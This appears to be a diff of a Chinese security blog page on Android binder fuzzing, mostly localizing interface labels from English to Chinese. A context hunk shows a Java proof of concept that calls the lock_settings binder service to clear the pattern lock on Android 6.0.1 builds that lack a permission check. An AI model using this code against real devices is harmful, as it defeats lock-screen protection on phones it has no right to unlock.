@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang=zh>
 <head>
     <!-- so meta -->
     <meta charset="utf-8">
@@ -12,7 +12,7 @@
 <meta property="og:url" content="http://usmacd.com/cn/Android_binder_fuzzing/index.html">
 <meta property="og:site_name" content="安全代码">
 <meta property="og:description" content="1. binder 简介Android安全模型的一个关键部分是每一个应用程序都被赋予一个唯一的 Linux 用户 ID 和组 ID，运行在自己的进程和 Dalvik 虚拟机里。在应用程序安装的过程中，Android系统设备上创建一个专门的目录（文件夹），用于存储此应用程序的数据，并且仅允许应用程序利用Linux 用户 ID 和组 ID 的相应访问权限对这些数据进行访问。此外，此应用程序的 Dalv">
-<meta property="og:locale" content="en_US">
+<meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/henices/pictures/master/20181226160614691_1337421380.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/henices/pictures/master/20181224151909041_1890401128.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/henices/pictures/master/20181224155625665_1820827979.gif">
@@ -72,18 +72,18 @@
 <body class="max-width mx-auto px3 ltr">
     
       <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
   <span id="menu">
     <span id="nav">
       <ul>
         <!--
-       --><li><a href="/">Home</a></li><!--
+       --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">About</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
@@ -95,18 +95,18 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/cn/android_intent_base_attack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="上一篇" href="/cn/android_intent_base_attack/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
-        <li><a class="icon" aria-label="Next post" href="/cn/afl/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="下一篇" href="/cn/afl/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
     <div id="share" style="display: none">
@@ -226,7 +226,7 @@
 
 <h3 id="2）-Android-6-0-1-MOB3OM-手势密码清除漏洞"><a href="#2）-Android-6-0-1-MOB3OM-手势密码清除漏洞" class="headerlink" title="2） Android 6.0.1 MOB3OM 手势密码清除漏洞"></a>2） Android 6.0.1 MOB3OM 手势密码清除漏洞</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> getIBinder(<span class="string">&quot;lock_settings&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">data1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line">	<span class="type">Parcel</span> <span class="variable">reply1</span> <span class="operator">=</span> Parcel.obtain();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		data1.writeInterfaceToken(serviceBinder.getInterfaceDescriptor());</span><br><span class="line">		data1.writeByteArray(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">255</span>]);</span><br><span class="line">		serviceBinder.transact(<span class="number">7</span>, data1, reply1, <span class="number">0</span>);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (RemoteException e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> IBinder <span class="title function_">getIBinder</span><span class="params">(String service)</span> &#123;</span><br><span class="line">	<span class="type">IBinder</span> <span class="variable">serviceBinder</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		serviceBinder = (IBinder) Class.forName(<span class="string">&quot;android.os.ServiceManager&quot;</span>)</span><br><span class="line">				.getDeclaredMethod(<span class="string">&quot;getService&quot;</span>, String.class).invoke(<span class="literal">null</span>, service);</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassCastException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">	&#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> serviceBinder;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>在Android 6.0.1 MOB3OM 之前的一些版本中, 未在setLockPattern 中做权限检查,<br>导致apk 不需要任何权限就可以将手势密码清除. </p>
-<p>这个问题已经修复 author Jim Miller <a href="mailto:&#x6a;&#x61;&#103;&#x67;&#105;&#x65;&#x73;&#x40;&#103;&#111;&#x6f;&#103;&#108;&#101;&#46;&#x63;&#x6f;&#x6d;">&#x6a;&#x61;&#103;&#x67;&#105;&#x65;&#x73;&#x40;&#103;&#111;&#x6f;&#103;&#108;&#101;&#46;&#x63;&#x6f;&#x6d;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
+<p>这个问题已经修复 author Jim Miller <a href="mailto:&#106;&#x61;&#x67;&#103;&#105;&#101;&#115;&#x40;&#x67;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#111;&#109;">&#106;&#x61;&#x67;&#103;&#105;&#101;&#115;&#x40;&#x67;&#111;&#x6f;&#103;&#108;&#x65;&#x2e;&#x63;&#111;&#109;</a>	Wed Apr 13 16:35:36 2016 -0700</p>
 <p><a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0">https://android.googlesource.com/platform/frameworks/base/+/b5383455b6cae093e60684b4f5cccb0cc440330d%5E%21/#F0</a></p>
 <p>但是考虑到Android 的碎片化问题, 估计在一些手机中将存在这个问题. </p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
@@ -247,11 +247,11 @@
     <div id="nav-footer" style="display: none">
       <ul>
         
-          <li><a href="/">Home</a></li>
+          <li><a href="/">首页</a></li>
         
-          <li><a href="/about/">About</a></li>
+          <li><a href="/about/">关于</a></li>
         
-          <li><a href="/archives/">Writing</a></li>
+          <li><a href="/archives/">归档</a></li>
         
           <li><a href="/search/">Search</a></li>
         
@@ -285,12 +285,12 @@
     </div>
 
     <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
         
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
   </div>
@@ -309,11 +309,11 @@
     <nav>
       <ul>
         <!--
-       --><li><a href="/">Home</a></li><!--
+       --><li><a href="/">首页</a></li><!--
      --><!--
-       --><li><a href="/about/">About</a></li><!--
+       --><li><a href="/about/">关于</a></li><!--
      --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
+       --><li><a href="/archives/">归档</a></li><!--
      --><!--
        --><li><a href="/search/">Search</a></li><!--
      --><!--
@@ -347,7 +347,7 @@
   <script type="text/javascript">
   $(function() {
     // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
     btn += '<i class="fa-regular fa-clone"></i>';
     btn += '</span>';
     // mount it!
@@ -358,7 +358,7 @@
       }
     });
     clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
+      e.trigger.setAttribute('aria-label', "复制成功！");
       e.clearSelection();
     })
   })
